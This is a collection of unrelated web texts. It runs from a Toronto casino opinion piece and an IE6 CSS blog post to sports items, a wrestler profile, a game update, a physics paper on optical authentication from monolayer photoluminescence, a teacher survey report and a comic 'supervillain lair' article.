It's based on McGuinty's need to have the OLG return as much profit to the government as possible from gambling, because McGuinty desperately needs it to fund health care, especially in light of his spectacular fiscal mismanagement of the Ontario budget, including the eHealth and Ornge scandals.
The job of Toronto councillors is to dispassionately weigh the increased jobs, tourism and tax base a casino-hotel would bring against problems such as more traffic congestion, new pressures on already stressed public infrastructure and the rise in social problems that accompany gambling.
And to remember that industry-generated polls claiming to show public support for a casino should be taken with a grain of salt, since such polls can be made to show anything, depending on how questions are asked.
Finally, councillors need to remember they work for us, not casino operators.
Some people think that IE6 is dead already. But only developers who have the luxury of a specialist audience, or who don't have any business interest vested in their work, can think like that. For the rest of us, who have a real-world audience of ordinary, non-technical users to think about, IE6 is still very much a going concern.
But maybe not for much longer. Now that IE8 is out we'll see a greater number of users finally upgrading; there's no doubt that Microsoft wil be pushing for this, and pushing hard. Quite apart from that, we're seeing a slow but steady progression of users moving away from Internet Explorer altogether, and turning to Firefox and other browsers; Arstechnica recently reported that Firefox usage is overtaking Internet Explorer in Europe for the first time. Inevitably, there will come a time when IE6 has a sufficiently minor audience that we can treat it like we did Netscape 4 a few years ago — as legacy technology that it no longer behoves us to support, and its remaining users as willfully stubborn individuals whom we're not required to pander to any longer!
--ADVERTISEMENT--
(It's funny really. You wouldn't go into your local mobile phone store and complain that the handset you bought in 2001 doesn't work on a 3G network and you can't get picture messaging on it. Yet for some reason, a minority of web users do behave exactly like that.)
Anyway, by my estimation, the day is approximately 12 months away when we'll be able to kiss a fond goodbye to IE6 support forever. And when that day comes, here are some useful things we'll be able to do that we couldn't really do on mainstream sites before:
Use child selectors No more having to define endless descendent rules to cancel out other descendent rules. With CSS2 child selectors we can specify CSS rules that only apply to direct children, not to descendants in general. Make full use of 24-bit PNGs No more blending images against different coloured backgrounds so that the edges have decent anti-aliasing. With PNG alpha-channel support we can use images with shadows, glows and other opacity effects, safe in the knowledge that all graphical browser users can see them. Use attribute selectors No more having to define type classes for inputs — things like <input class="text" ... /> — when we can address them with CSS2 attribute selectors like input[type="text"] . We can even use CSS3 substring-matching attribute selectors (supported in all modern browsers including IE7 ), which can be very useful for defining selectors that apply to a range of different attribute values, thereby reducing significantly the amount of code it takes to address groups of elements with similar class names (for example). Use a wider range of display properties Being able to use things like display:inline-block instead of float:left means no more endless float within float, or the slightly-dubious use of overflow:hidden , just to get blocks to clear properly. (Though I should point out, we had to wait until Firefox 3 for this one too!) Use min-width and max-width Although IE6 ‘s implementation of width is very similar to the correct implementation of min-width, it's not the same, and it doesn't serve every purpose; and it doesn't do anything about max-width. With the end of IE6 can come a new renaissance in block-layout design, with the greater flexibility that designers have been crying out for for years. Throw away 90% of CSS hacks (and 90% of the reasons for needing them!) No more worrying about bizarrely repeating characters, mysteriously invisible blocks, or frustrating double margins; with the end of IE6 comes the end of needing to be able to diagnose and cure such a large array of rendering bugs. Add abbreviations that everyone can see Although personally, I only use the <abbr> element and never use <acronym> , still it does occasionally irk me to remember that IE6 users won't see the expansion, and bugs me even more on the odd occasion that I need to script for them (and can't). Trust z-index again No more scratching our heads as we ponder why layer X is on top of layer Y when it should be beneath, wondering what we might have done wrong, only to remember that — d'oh — we haven't done anything wrong, it's a stacking context bug in IE6 . Save time and money Significantly less time spent hacking means shorter development time and lower development costs. Enjoy ourselves again! Writing CSS will become the pleasure that it used to be. That is, until our expectations rise again, and IE7 becomes our nemesis …
But 3 Things We'll Still Have To Wait For
Sadly, there are still plenty of things we won't be able to do with impunity until IE7 is also just a memory!
Use CSS Counters So we still can't let go of the unfortunately-deprecated start attribute, or do any of the interesting things we want with generated content. Use the box-sizing property The CSS3 box-sizing property, implemented in IE8 and other modern browsers, means that we can finally choose for ourselves which box model we want for a particular situation, and end, once and for all, the tedious arguments over which one is “correct”. Any improvements to JavaScript There are many things I'd like to see for day to day JavaScript programming — an end to event target forking, a single event-listening mechanism, reliable and consistent retrieval of computed style properties — but all of that will have to wait until IE7 has also gone the way of the fairies, because only in IE8 have any improvements to the scripting engine been made (although what those improvements actually amount to remains to be seen!).
So mark the day in your calendar, for early in 2010, when the fuller potential of CSS will finally begin to emerge!

Visit Florida Racing team owner Troy Flis has downplayed reports that Visit Florida is set to suspend title sponsorship of his team, and said he's hopeful of coming to an agreement of continuing its long-standing partnership with the state's official tourism board.
The Sarasota Herald-Tribune reported last week that Visit Florida gave a 30-day cancelation notice on June 2 to Flis' Spirit of Daytona operation, in wake of budget cuts, primarily around sponsorship programs.
A $76 million marketing plan was approved by its board of directors on Tuesday that, however, eliminates $11 million from its sponsorship pool, which, according to reports, included a $2.875 million contract with Flis' team.
“Right now we're still in negotiations with them and talking with them on going further,” Flis told Sportscar365.
“We had an agreement with them through the end of this year. Some other stuff is [indicating] they are going to cut that. But there's still stuff happening.
“[Visit Florida] will be on the car until our agreement is totally null and void.
“Right now, they'll be on the car for the next couple of races for sure and I don't see them coming off.”
While having served as the primary sponsor the for last four-and-half years, including the rebranding of the team to Visit Florida Racing in 2015, Flis admitted he's working on securing additional sponsorship for his Riley Mk. 30 Gibson, should the deal come to an early end.
“We have some other potential stuff happening,” he said. “We'll be working on that pretty hard right now too just to have a plan because we know we need something.”
Flis has given high praise to the tourism board, which he credits the Visit Florida campaign for bringing millions of tourists to the state annually since the program's launch in 1996.
More than 112 million tourists visited Florida last year, spending $108 billion and supporting nearly 1.5 million jobs.
“We've been a really good partner for them and they've been a really good partner for us,” Flis said. “We'd hate to see it go and I don't believe it's anything team-related. It's just kind of a politics thing and how it's laid out and what's happening in Florida right now.
“Once they can restructure what they're going to do… We believe we are one of their better partners and I think they do too. We're hoping they decide the same way and they stick with us.
“We owe it to them as they've been really good to us. If I don't have anything else to put on [the car], I'd rather have Visit Florida on there.”
Matchday Preview 1: Where the Eddies Come Sweepin' Down the Plain
FieldTurf of Dreams Blocked Unblock Follow Apr 1, 2016
Tweaked Eddies face a tough and interesting matchup against a team that hasn't shown many of its cards yet.
During each of the the Eddies' matches on the preseason tour of Scotland, they exclusively employed 4–4–2 formation. With the exception of Ledgerwood holding the middle, we may see a variety of combinations line up beside him as the season progresses. The four matches in Scotland displayed this variety with different sets of wingers employed. Although Corea has not been with the squad for the good part of a month — missing the Scotland trip in the process — comments from Miller make it appear that he is going to be a key part of the season moving forward.
On Sunday, FCE played a full 90-minute intra-squad game. Other than the omission of Ledgerwood and Corea, both away on international duty, one of the sides featured a lineup that looked very much like the lineup we will see on Saturday.
Raudales was tipped by Jeff Paulus in an interview on the Loyal Company podcast (Episode 46) as someone who can serve as a backup holding midfielder if Ledgerwood is absent. The staff also seem to highly rate Gustavo, and preseason appearances demonstrate this. Look for him to support the attack primarily as a playmaker up the middle, while also given a secondary role as a striker.
This blog has previously written about the potential use of inverted wingers, due to the lack of natural left-footed players in the squad, and we may see this for the first time on Saturday. Corea has filled both central and winger roles in the past, but many previews see him lining up on the left side.
Projected lineup. Also note that while 7 substitutes can be dressed, the team has historically only brought 5 on most trips
Opposition
While Rayo OKC has had a decent preseason, there is little information—other than goal scorers and full time scores—to even hint at what the lineup will look like on Saturday. For now, we can try to highlight individual players and their specific threats, and see how this combination will affect FCE's game plan.
Let's start with the big fish first, Giorgios Samaras. While there is word that he may not even be fit enough to start or even appear tomorrow, there is a bit of gamesmanship regarding his status. Nevertheless we can still try to evaluate an OKC gameplan that will be centered around their superstar. Samaras are by far the most reputable name on the OKC team sheet, and brings an impressive résumé of experience to their squad. At 34-years old however, and having not played a full match for a while, there are still many questions to how fit and ready he will be tomorrow.
Samaras' most obvious advantage is as a tall target man weather it is at the end of a cross for a header, or as someone who can bring the ball down to set up other attackers. Beyond his physical qualities, however, Samaras' footwork is enough to impress even the best dribblers on most teams. On top of these Samaras has an impressive work rate and makes his defenders work very hard to win the ball from him, and he is very tough to chase down.
But, with the potential absence of Samaras come other players who, on paper, have playing reputations preceding them and will have a lot to prove.
Billy Forbes is a proven NASL striker who had shown a keen eye for goal for San Antonio last year, scoring twice at Clarke early in the Spring last year. Richard Menjivar is another proven NASL midfielder who even scored a few goals in preseason for Rayo, adding to the depth of the attack. Menjivar's role as a winger will be key for Rayo. Aside from established NASL talent, there are also MLS players with chips on their shoulders. Players like Futty Danso in defence, and former TFC strikers Ryan Johnson & Robbie Findley.
What to watch out for
The positioning on the left side
Eckersley appears to be the starter on the left flank of the defense. Look for how high he is encouraged to play when in possession, as this was one of the primary reasons why he was brought in by Miller.
Given that the left winger on the day may be either of the right-footed Corea or Cruz, this may leave space open for Eckersley to move in to and provide the crosses. This was his role for so many years in Scotland. On defence, however, Eckersley might have to think twice about committing to marking the real threat that Menjivar poses, and an attack-minded Eckersley will leave a lot of real estate behind him. This means that the communication between the central defensive players—Diakité, Watson and maybe Ledgerwood—is paramount.
On the right side, Edward may be encouraged to attack, but with Nyassi likely lining up on the right wing, the two have the option to overlap and fill in for each other in transition.
Attacks up the middle
The departure of Laing has required a shift from focusing the attacks on the wings and look for options up the middle. This is somewhat new ground for FC Edmonton, it has been quite some time since the squad has played a 4–4–2, and this will require mobility in the middle. Expect to the squad to look to the central midfield as a point of transition more than we're used to seeing.
We have seen hints of this when players like Boakai were used as a focal point of an attack. Gustavo may be filling this role tomorrow. Look for runs with the ball and one-twos from him. Ledgerwood has a bit to play in this as well, but will likely be used deep, only joining an attack in late when needed, not unlike Ritchie Jones when he's healthy.
So what scoreline are you predicting FieldTurf?
DON'T DO THIS TO ME. MY HEART SAYS 2–1 WIN. BUT MY GUT SAYS 1–1 DRAW.
Chances are, if you wrestled your final WWE match at the tender age of twenty, you'd mope about it bitterly for years following.
Not if you're Zach Gowen.
For a five-month frame in 2003, the pre-booze-age Gowen lived the dream of any fan, coming to the aid of Hulk Hogan, scoring pinfalls on The Big Show and Matt Hardy, and even had a pay-per-view battle against wrestling's most powerful figure, Vince McMahon. That's plenty to take in for someone barely out of grade school.
“I was overwhelmed; you would be too!” Gowen merrily recalls. “My reaction (to getting signed) was shock and amazement when they called me. I was a bag boy at a local grocery store when Johnny Ace called me. Becoming a WWE superstar wasn't even a thought in my head.”
“The first day on the job, at a Smackdown taping, here I was having a conversation with Hulk Hogan, Roddy Piper, and Vince McMahon before the show. I loved wrestling Vince. It was so cool for me to see just how freakin' dedicated and hardworking this man is. He's truly a pioneer and is up there in the same ranks as a Steve Jobs or Bill Gates.”
For anyone to be in any position to rub shoulders on a national stage with such storied icons is unfathomable, triply so when you've got only one leg.
To know of Gowen is to know that, following a cancer diagnosis, his left leg was amputated at age eight. This made the pipe dream of finding success in any physical vocation, let alone touring as a professional wrestler, even more exceedingly daunting.
Yet to see Gowen perform, compensating for the missing limb as imaginatively as his mind and drive allow, is a thing of beauty. Running the ropes with a striding hop, and skipping up turnbuckles, represent two parts of a spectrum: artistic grace, and defiance toward hindrance. Now 31 years old, Gowen feels he's perfected his act.
“The obstacles themselves have become almost obsolete. I was signed and put on the road after having less than 20 matches,” Gowen reveals. “It's crazy to think about the idea of me being in WWE was a live experiment being played out on TV in front of millions on a weekly basis!”
“I didn't know what I had, and the WWE didn't fully comprehend how to get the most out of me, so there was a lot of throwing s–t against the wall to see if anything would stick. It bothers me a little bit that some fans think what they saw on TV is what my act is all about. That's why it's always a treat to wrestle at these independent shows for kids who have never seen me before, *and* for the fans who think they know all I'm capable of!”
Zach Gowen would last less than a year under WWE contract, but rather than chalk up the parting of ways as a failure, he instead looks at the positives of the reality check he received at a young age.
“I learned many lessons in the ring, but the biggest lessons learned were life lessons. Unfortunately for me, I had to learn most of these lessons by dealing with the repercussions of doing the exact opposite! Show up on time, how to conduct yourself as a professional, be kind to everyone, be helpful, etc. Wrestling has really laid the foundation for my life in a lot of ways.”
Post-WWE, Gowen lent his services to a number of high-profile organizations, including TNA, Ring of Honor, and even the Insane Clown Posse's cult-status JCW promotion. Perhaps as he was destined to do, Gowen found his kindred spirit in Gregory Iron, a popular independent star most notable for overcoming his own affliction, cerebral palsy.
Together, Gowen and Iron perform as “The Handicapped Heroes”, serving to both inspire and dazzle onlookers across the globe. They even took on a manager, a young woman named Jill Dials, who's confined to a wheelchair thanks to spina bifida.
“To have had, and to continue to have, the impact on the lives of fans with disabilities worldwide, Greg and Jill included, is absolutely astonishing and mind-blowing to me. I appreciate that more than ever now. I'm blessed.”
Gowen openly embraces this lot in life, to be seen not as a sideshow act, but as a real person making the most of life's hand, showing others that anything can be achieved. By mining success and reward out of each day, each performance, and each appearance, it's more than within reason that others can do the same, disabled or not.
“After disappearing from wrestling for a number of years, I came back stronger. I'm fully engaged and living life on my terms. I'm a father and a husband. I wrestle full time on the independent scene, speak full time to the youth of America, and just released the most in-depth piece on my life ever made: a documentary called “Finding Zach Gowen”.
The documentary timelines Gowen's life and career, featuring testimonials from peers such as Truth Martini (Gowen's trainer), Rhino, Jimmy Jacobs, former WWE official Jim Korderas, along with Gowen, his mother, and numerous others. Within, Gowen opens up about not just the obstacles of his cancer diagnosis and subsequent life adjustments, but also the drug use that plagued him in adulthood.
Gowen makes no excuses for his choices, and puts them on par with his childhood illness: just something else to defeat.
“I believe the sole purpose of my existence is to be of maximum service to God and to my fellow human travelers on this planet. One way I do that is by sharing my story through various platforms, in this case, professional wrestling.”
With many opportunities ahead of him, and many more souls to reach, Gowen would change seemingly nothing of his past. Incidentally, he'd change nothing of his present either.
“I have no goals in wrestling except to shine inspiration on whoever needs it when they see me in action. I would be an asshole if I asked for anything more, not only in wrestling, but in life. Wrestling has provided me a life beyond my wildest dreams and for that, I'm eternally grateful.”
(Mr. Gowen is available for speaking engagements through http://www.coolspeakers.net/, and accepts bookings through his website, www.zachgowen.com)

Dysfunctional Systems: Episode 0 on Steam
Hello,
We spent some time rewriting episode 0 of Dysfunctional Systems and finished what needed to be done, with a few necessary omissions.
It will become available on Steam as soon as it's approved (we're aiming for July 24th) and all backers will receive a Steam key regardless of whether or not they received a refund. You should receive your key within the next few days.
Also, I'm pleased to announce that development on episode 2 has restarted, with the art director from episode 1 returning. Please note that the story of episode 2 will be completely different from what was described in the Kickstarter.
Thank you for your patience, and I hope you enjoy episode 0. A trailer for the episode is below.
The most common defects in exfoliated disulphide TMD is zero-dimensional sulfur vacancies [ 25 ]. Upon the removal of a sulphur atom, the transition metal is left with an unpaired electron, which introduces unintentional n-doping [ 26 ]. On the other hand, W or Mo vacancies could lead to unintentional p-doping. Bandgap renormalization occurs as a result of the doping, as confirmed by the shift in peak emission wavelength across the sample, depicted in figure 2(c) . Adatoms can also lead to similar doping effects, as demonstrated by several studies [ 27 , 28 ].
Next, we applied a rectangular function that zeroed the value of all pixels except those with a peak wavelength falling within a specific range, approximating the effect of an ideal optical bandpass filter. Changing this filter wavelength range then simulates different angle of incidence, as we described previously. This simple function highlights the PL spatial variation within a monolayer and by changing the detection spectral window, corresponding to θ in figure 1(a) , different spatial regions can be turned on and off. We showed three spectral windows in figures 2(d) – (f) , corresponding to increasing the BPF incidence angle. This simple function takes into account the peak wavelength as well as the gradient of spatially varying intensity, but it exaggerates the differences between each filter orientation for visual effect. In practice, the difference from one angle to the next is less obvious, since the transmission band picks out a range of wavelengths, rather than only those with peak wavelength in the window.
Figure 2. (a): 50 × Optical image of the exfoliated flake on PDMS. μ-PL map of this flake was recorded with 532 nm excitation and 100 μW excitation power at 300 K. The integration time for each pixel is 0.5 s. We took spectra from each map co-ordinate and used a Gaussian fit to determine the peak intensity (in counts per second) and the peak wavelength (in nm), plotted in (b) and (c) respectively. In (d)–(f) we applied a rectangular function that selected pixels with peak wavelength falling within a certain band. In all cases, scale bars correspond to 50 μm.
In figure 2 , we excite an exfoliated monolayer on PDMS with 532 nm laser, focused to a sub-micron spot with a 0.9 NA objective lens. The same objective collects the PL, which was then measured by a Horiba LabRAM HR spectrometer. PDMS, being an elastomer, relaxes strain in the monolayer, enabling extraordinarily large flakes hundreds of microns in length to be routinely obtained, as shown by figure 2(a) . In comparison to recent work on large area TMD mechanical exfoliation [ 24 ], this method does not require an atomically flat gold substrate and eliminates the intermediate sonication step. Here, the μ-PL measurement serves the purpose of showing the photoluminescence inhomogeneity across the samples, this method is impractical for real PUF implementation however, due to it's size and cost. We used Gaussian-type fitting for each pixel and extracted maps of peak intensity and wavelength, respectively shown in figures 2(b) and (c) .
Defects can degrade the optical quality of monolayer emitters, potentially harming the efficiency of optoelectronic devices. For authentication purposes as a PUF, however, atomic level disorder is a bonus. Defects that tend to increase the spatial inhomogeneity in photoluminescence, the distribution, density and variety of which all contribute to the structural complexity of the optical PUF. We found that the variation in emission energy with filter angle is more pronounced with CVD flakes, though sufficiently large area exfoliated flakes may also be suitable for this application.
The CVD growth mode is based on a bottom-up crystal nucleation on a target substrate. While other bottom-up synthesis methods exist such as atomic layer deposition [29], pulsed laser deposition [30] and physical vapor deposition [31], crystal size and the quality of the flakes are limited in general compared to CVD. Quality of flakes grown using CVD is heavily dependent on reaction kinetics, which is varied and lead to immense difficulty in reproducing the same growth conditions across different reactors. Monolayers synthesized by chemical vapor growth have defective properties that depend on the types of substrate being used, lattice mismatch at the material-substrate interface, thermal stability and chamber conditions. In addition to point defects, CVD grown monolayer TMDs also exhibit one-dimensional defects, such as agglomerations of sulfur vacancies in a line [32, 33], grain boundaries [34, 35] and dislocations [36, 37].
Figure 3 shows the images recorded using filter-angle modulation, for a selected flake. In each case, PL was imaged through a bandpass filter, Thorlabs FLH633-5, center wavelength 633 nm and bandwidth 5 nm, attached to an angle-variable mount, following illumination using a 450 nm laser at an angle. Laser power density is approximately 3 . In this arrangement, the microscope effectively operates in darkfield mode. The objective lenses used were an Olympus long working distance 50× and a Zeiss 10×. The 10× images were deliberately cropped to highlight the same flake as recorded using the 50× objective lens. Lastly the CCD is a thermoelectrically cooled sony ICX825 sensor array.

In all cases, scale bars correspond to 20 μm. Download figure: Standard image High-resolution image Export PowerPoint slide
Once θ is set to , we focused the image under brightfield white light illumination first, then with only laser illumination an image is acquired. As the BPF transmits a narrow band centered at 633 nm at , only the single layer photoluminescence is imaged. Subsequent images for nonzero θ were acquired in a similar fashion. Due to undesired reflections within the filter, the transmitted PL also acquired a slight deflection before reaching the sensor, for changing θ. This deflection translates into a lateral image shift. After image acquisition, we processed the image series using MATLAB in the order of image registration, background subtraction and pixel-level analysis. Image registration matches geometric features from an image to the next, moving each laterally so that the same features align in all images, correcting the image shift. For background subtraction, a rectangular area representative of the background in each image was selected, averaged over all pixels in the selection and subtracted the average from all other pixels in the original image. We found that this is equivalent to dark frame subtraction in effect, but much easier to implement. The analysis carried out is as follows. First the greyscale value at each pixel represented by an co-ordinate for each θ is extracted, into a four-dimensional matrix , where I denote the pixel value. Then, for each image in the series, , the difference was found, where n is the index of an image in the sequence. We then repeated the entire procedure from acquisition to analysis for the 10× objective lens.
The CVD grown domains are a mixture of triangular and hexagonal shapes. Different geometries in growth arise from variations in the growth rate of different edge terminations. In all cases, the domains start with a nucleation site, growth then favors the sides of the nucleation with the highest surface free energy, which leads to different final domain shapes. Figure 3 shows a chosen large area domain. As θ is increased, a number of visually striking features can be observed. Firstly, lines connecting inner vertices and the nucleation site become brighter, they are likely to be grain boundaries between edges with differing terminating atoms. Then, for low angles we can see a distribution of 'spots', which vanish for higher angles. The emission intensity for the entire domain attenuates in general for higher angles, but the opposite is true around the nucleation site. Lastly, a dark concentric band can be seen that does not change with θ.
The fact that these emissive phenomena are picked out by the BPF at higher angles suggest a blueshift in the optical spectrum, possibly caused by higher order of quantum confinement. It is well known that the optical and excitonic properties of monolayer TMDs are highly susceptible to atomic interactions with their substrates as well as defect induced doping. The optical bandgap as well as the exciton binding energy can be significantly renormalized by the dielectric screening effect via modifications to the inter-carrier coulomb interactions [38–42]. Trapping centers in the substrate [43, 44] within interaction length with the monolayer can also introduce unintentional charge transfer phenomena leading to inhomogeneous broadening. Additionally, structural defects created under laser irradiation can lead to localised doping that shifts the ratio of trion-to-exciton intensity over time [45]. In our case, emissive phenomena such as luminescent lines at higher BPF angles could be addressed by a mixture of the above described mechanisms. It may be possible to isolate these effects for our sample, using controlled dielectric environments for instance hexagonal Boron-Nitride encapsulation, instead of direct bonding with , at cryogenic temperatures and investigate excitation-power dependent as well as excitation-time dependent photoluminescence energy shifts.
Though already visually clear, the pixel difference maps in figure 3 highlight the effect of filter angle modulation, showing the blueshifted emission from surface defects. The fact that we can image these defects even with a low magnification objective lens implies that our system for unique information extraction can potentially be simplified into one with much lower overhead.
Other areas on this sample also displayed similar filter angle dependent photoluminescence. We once again show the images taken with the 10× lens in figure 4, except with a larger image area. In this case we highlight three other emissive areas in the vicinity of the one previously investigated. Structures similar to the grain boundaries identified before exhibit blueshifted photoluminescence detected using only higher BPF angles ( nm, nm). We identify two flakes containing line defects that behaved in this way. In contrast, the image signal detected from areas on the domains away from the 'lines' attenuate with increasing θ.

Red circles highlight flakes that showed the most pronounced changes. (a) , (b) and (c) intensity differences between and . In all cases,scale bars corresponds to 100 μm.

Atomic force microscopy (AFM) was used to investigate the nanoscale origin of the features highlighted in the optical measurement in figure 3. The observed behavior of the optical emission, originating from the flake vertices and grain boundaries during angular dependence PL meant that the topographical structure of these areas was of particular interest. AFM images were taken with a Bruker MultiMode 8 scanning probe microscope in Tapping Mode using Budget Sensors Tap300Al-G probes.
A large number of defects on the flake surface were found, confirming the BPF angular dependent photoluminescence previously discussed, in the form of either holes or protruding features. Whereas the majority of the flake is monolayer in thickness, the end of each outer vertex, shown in figures 5(b) and (c), is characterized by the presence of a much larger structure approximately 25 nm in height and 1.5 μm across. Similar features up to 10 nm in height also populate the flake edge. The presence of these structures is mainly observed to be within 1 μm of the flake edge, with few large scale features being observed across the majority of the flake surface. Grain boundaries between the inner vertices, shown in figure 5(d), along with the center of the flake can also be observed and appear to be bi-layer in thickness. These grain boundaries correspond to regions in angular dependence PL measurements that peak in intensity towards the blue end of the wavelength range.
Half of America's public school teachers say they feel great stress several days a week and are so demoralized that their level of satisfaction has dropped 23 percentage points since 2008 and is at its lowest in 25 years, according to an annual survey of educators.
The 29th annual MetLife Survey of the American Teacher, which is being released today, has more bad news about the effects of modern school reform: Only 17 percent of teachers and 22 percent of principals are very confident that the Common Core State Standards, an initiative supported by the Obama administration that is being implemented in most states, will actually improve student achievement.
It's no wonder so many teachers have low morale. They say that modern school reform — with its emphasis on getting rid of bad teachers, assessing teachers by student standardized test scores, and rewriting tenure and collective bargaining laws — essentially demonizes them.
Here are the major findings taken from the report, called “Challenges for School Leadership”:
Principals take responsibility for leadership of their schools.
*Nine in 10 (89%) principals say that ultimately a principal should be held accountable for everything that happens to the children in a school; 74% of teachers agree in 2012, compared with 60% in 1989.
The job of principal is becoming more complex and stressful.
* Three-quarters (75%) of principals feel the job has become too complex.
* Seven in 10 (69%) principals say the job responsibilities are not very similar to five years ago.
* Job satisfaction among principals has decreased nine percentage points in less than five years, to 59% very satisfied from 68% very satisfied in 2008.
* Half (48%) of principals feel under great stress several days a week.
* Only about four in 10 principals say they have a great deal of control over curriculum and instruction (42%), and making decisions about removing teachers (43%).
Teachers take leadership in schools and think principals are doing a good job.
* Half (51%) of teachers have a leadership role in their school, such as department chair, instructional resource, teacher mentor, or leadership team member.
* Half (51%) of teachers are at least somewhat interested in teaching in the classroom part-time combined with other roles or responsibilities in their school or district, including 23% who are extremely or very interested in this option.
* Eighty-five percent of teachers rate the job their principal is doing as excellent or pretty good.
* Nearly all principals (98%) rate the teachers in their school as doing an excellent or pretty good job.
* Most teachers (69%) say they are not at all interested in becoming a principal.
The biggest challenges leaders face are beyond the capacity of schools alone to address.
*More than half of principals (53%) and teachers (56%) report that their school's budget has decreased in the past 12 months.
*Half (50%) of teachers and 40% of principals say managing the school budget and resources to meet school needs is very challenging; overall, 86% of teachers and 78% of principals say this is challenging or very challenging for school leaders.
*More than seven in 10 educators identify addressing the individual needs of diverse learners (83% of principals; 78% of teachers) and engaging parents and the community in improving education for students (72% of principals; 73% of teachers) as challenging or very challenging for school leaders.
Principals and teachers have similar views on academic challenges, but diverge somewhat on their priorities for leadership.
*A majority of educators say implementing the Common Core State Standards (67% of principals; 59% of teachers), creating and maintaining an academically rigorous environment (64% of principals; 62% of teachers), and evaluating teacher effectiveness (53% of principals; 56% of teachers) are challenging or very challenging.
* Principals are most likely to say it is very important for principals to be able to use data about student performance to improve instruction (85%) and to lead development of strong teaching capacity across the school (84%) to be an effective school leader.
 Teachers are most likely to say it is very important for a principal to have been a classroom teacher (79%) and give less importance to leading the development of strong teaching capacity across the school (69%) and using data about student performance to improve instruction (53%).
Teacher satisfaction continues to decline.
*Teacher satisfaction has declined 23 percentage points since 2008, from 62% to 39% very satisfied, including five percentage points since last year, to the lowest level in 25 years.
*Half (51%) of teachers report feeling under great stress several days a week, an increase of 15 percentage points over 36% of teachers reporting that level in 1985.
*Less satisfied teachers are more likely than very satisfied teachers to be in schools where budgets declined in the last 12 months (61% vs. 47%) and to identify maintaining an adequate supply of effective teachers (58% vs. 43%) and creating and maintaining an academically rigorous learning environment (66% vs. 56%) as challenging or very challenging for school leaders.
*Less satisfied teachers are more likely to be located in schools that had declines in professional development (21% vs. 14%) and in time for collaboration with other teachers (29% vs. 16%) in the last 12 months.
*Nearly all teachers (97%) give high ratings to other teachers in their schools.
Challenges cited by educators are greater in high-needs schools.
*More principals find it challenging to maintain an adequate supply of effective teachers in urban schools (60% vs. 43% in suburban schools and 44% in rural schools) and in schools with two-thirds or more low-income students (58% vs. 37% in schools with one-third or fewer).
*Principals in schools with at least two-thirds low-income students are more likely than those with one-third or fewer to say that engaging parents and the community in improving the education of students (86% vs. 46%) is very challenging or challenging.
*Principals who feel great stress several days a week are more likely to work in schools where no more than some students are performing at or above grade level in English language arts or math (57% vs. 43% of those in schools where most students perform at or above grade level).
*In schools with at least two-thirds low-income students, 37% of principals and 27% of teachers say that most of their students are performing at or above grade level. In contrast, in schools with one-third or fewer low-income students, 91% of principals and 83% of teachers say that most of their students are achieving at this level.
*Teachers and principals in schools with more than two-thirds low-income students are less likely than those in schools with one-third or fewer low-income students to give their teachers an excellent rating (48% vs. 73% for teachers; and 51% vs. 75% for principals).
Educators are confident about implementing the Common Core, less so about its potential for increasing student success.
*Nine in 10 principals (93%) and teachers (92%) say they are knowledgeable about the Common Core.
* Nine in 10 principals (90%) and teachers (93%) believe that teachers in their schools already have the academic skills and abilities to implement the Common Core in their classrooms.
*Teachers and principals are more likely to be very confident that teachers have the ability to implement the Common Core (53% of teachers; 38% of principals) than they are very confident that the Common Core will improve the achievement of students (17% of teachers; 22% of principals) or better prepare students for college and the workforce (20% of teachers; 24% of principals).
*A majority of teachers (62%) and a smaller proportion of principals (46%) say teachers in their schools are already using the Common Core a great deal in their teaching this year.
The Mad Scientist's Lair Construction Kit: A Software Developer's Guide to World Domination Carol Pinchefsky
Are you thinking what I'm thinking? If it's, "Software developers would make perfect mad scientists," then the answer is "Yes" and "We may both suffer from megalomania, but my delusion is greater than yours."
But if you weren't thinking that software developers would make perfect mad scientists, think again.
Most software developers I know are mild-mannered citizens who give others absolutely no reason to suspect they're manipulating the stock market to pay their SPECTRE membership fees. Developers also tend to be reasonably affluent, and as a U.S. News & World Report article tells it, software development is one of the better-paying jobs in the tech industry.
What with the ability to go unnoticed, a few extra dollars in your pocket, and your background in technology, obviously you have what it takes to be the next Bond villain.
Sadly, there's no one-stop shop for the on-the-go megalomaniac, so the future Doctor Doom has to do some advanced research. But since SmartBear excels at providing information that software developers need to better do their jobs, it stands to reason that it can give you all the information you need to rule the world.
But not if I beat you to it.

Every evil genius needs an evil lair, and privacy is as much a part of your operation as a suit with your name stitched into the pinstripes. But software developers with aspirations such as yourself are at a disadvantage when it comes to owning a private island for one important reason: You need power. That is, you need a steady supply of electricity to fuel your nightmare machine.
Sites such as Vladi Private Islands and PrivateIslandsOnline not only offer homes that preclude interference from nosy neighbors, but also are situated atop an abundant supply of eco-power. That's right. Eco-power. Because conquering the world and saving it are not mutually exclusive.
For example, a tropical island can offer 300+ days of sunshine for solar power, and a craggy Hebridean island can offer as much wind as the god Boreas does before you wrest his power from him.
Inner Sanctum
Any supervillain worth their kryptonite knows that for true concealment you don't just need a secret lair. You need a lair within your lair. And for that, you need services of a company like Hidden Passageway, who will hide your special laboratory in unassuming places, such as behind bookshelves and under staircases.
Also, watch the tour of Richard Garriott's secret-passage-filled home, Brittania Manor, as well as his latest home in NYC, to see how it's done. (Note to self: May need to “deal” with Garriott.)
Hiding in a secret room can save you when the FBI/CIA/OSI/Avengers/Tin Tin turn up, plus it'll keep your minions guessing as to your whereabouts. Remember, you can't be ominously omnipresent if you're, you know, actually present.
Henchmen, Minions, and Expendables
Every super villain needs a supply of anonymous jump-suited and disposable minions to do their bidding. These men and women are a defensive strike against any interfering do-gooders and they make sure your organization is running smoothly, freeing you up for your important chess game with Evil Deep Blue.
A well-rounded stock of minions include:
Henchmen (or as software developers might call them, "team leads"). These competent people are what you need to scale up from the cackling-in-the-basement phase of the solo supervillain to the head of a world-spanning entity of malign corporate intent with a hierarchy of command.
Private security specialists who operate your command center. You do have a command center, don't you?
have a command center, don't you? Bodyguards. With the right people at your side, or in front of you to soak up bullet damage, there's no telling where you can go.
Decorative servants. Dedicate at least one servant to fan you with palm fronds and another to peel your grapes for you.
Ex-Swiss military. Because these are the people best qualified to ski down a mountain with a machine gun. (Your island doesn't have a mountain? Build one.)
Robot Army
Robot armies. They don't feel pity or remorse or fear, and they absolutely will not stop, ever, until some meddling hero enters their self-destruct code.
And you can build your very-own robot army thanks to some wonderful 3D printers and Daniel Wilson's handy guide. Or you can recruit a few of the roboticists on the rise, many of whom entered DARPA's Robotics Challenge.
If you aren't in a particular hurry, you can wait for a government to build a robot army and take it over. Oh look, South Korea has a few perfectly good robot sentries already.
You may want to consider this piece of (un)friendly advice: Don't program in a self-destruct code.
The Hounds (and Other Pets)
